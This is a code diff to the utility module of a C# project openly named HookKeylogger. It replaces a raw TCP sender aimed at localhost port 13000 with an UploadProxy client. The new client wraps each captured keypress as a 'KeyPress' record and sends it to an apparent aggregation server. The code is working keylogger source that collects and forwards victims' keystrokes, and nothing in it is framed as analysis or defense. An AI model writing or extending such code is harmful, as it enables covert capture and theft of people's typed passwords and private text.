@@ -1,8 +1,7 @@
 ﻿using System;
 using HookKeylogger.Base;
 using System.Windows.Forms;
-using System.Net.Sockets;
-using Google.Protobuf;
+using HookKeylogger.AggergationServer.Types;
 
 namespace HookKeylogger.Utils
 {
@@ -14,28 +13,17 @@ namespace HookKeylogger.Utils
             Console.WriteLine(path);
             Console.ReadKey();
             KeyPressBuffer kpb = new KeyPressBuffer(path);
-            String addr = "127.0.0.1";
-            Int32 port = 13000;
-            TcpClient c = new TcpClient(addr, port);
-
-            StreamExtension stream = new StreamExtension(c.GetStream());
-
+            UploadProxy.UploadProxyClient client = new UploadProxy.UploadProxyClient();
             foreach (KeyPress ks in kpb.Keys)
             {
-                Console.Write(ks.Key);
-                Console.WriteLine((Keys)ks.Key);
-                if (stream.IsConnected())
-                {
-                    Console.WriteLine("Connected");
-                    ks.WriteDelimitedTo(stream);
-                }
-                else
-                {
-                    Console.WriteLine("Not Connected!");
-                    break;
-                }
+                Console.WriteLine(ks.Key);
+                var ci = new CI();
+                ci.Type = "KeyPress";
+                ci.Data = ((Keys)ks.Key).ToString();
+                Console.WriteLine("DATA: " + ci.Data);
+                client.SendCi(ci);
             }
-            stream.Close();
+            client.close();
             Console.ReadKey();
         }
     }
